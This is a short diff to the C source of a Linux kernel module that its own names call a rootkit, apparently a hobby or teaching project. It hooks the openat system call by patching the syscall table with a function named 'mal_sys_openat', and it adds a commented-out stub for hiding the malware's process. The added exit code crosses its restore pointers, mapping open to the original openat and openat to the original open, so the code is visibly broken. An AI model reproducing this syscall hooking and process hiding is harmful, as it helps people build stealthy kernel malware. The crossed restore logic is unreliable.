@@ -80,12 +80,16 @@ static int __init rootkit_init(void)
 		patch_syscall(__NR_openat, (uint64_t)mal_sys_openat);
 
 		// TODO: find malware process and remove from process list
+		// hide_task_struct();
 		return 0;
 }
 
 static void __exit rootkit_exit(void)
 {
 		// Here, install exit procedures for the rootkit
+		// repair syscall table
+		patch_syscall(__NR_open, (uint64_t)original_sys_openat);
+		patch_syscall(__NR_openat, (uint64_t)original_sys_open);
 		printk(KERN_INFO "Exiting...\n");
 }
 
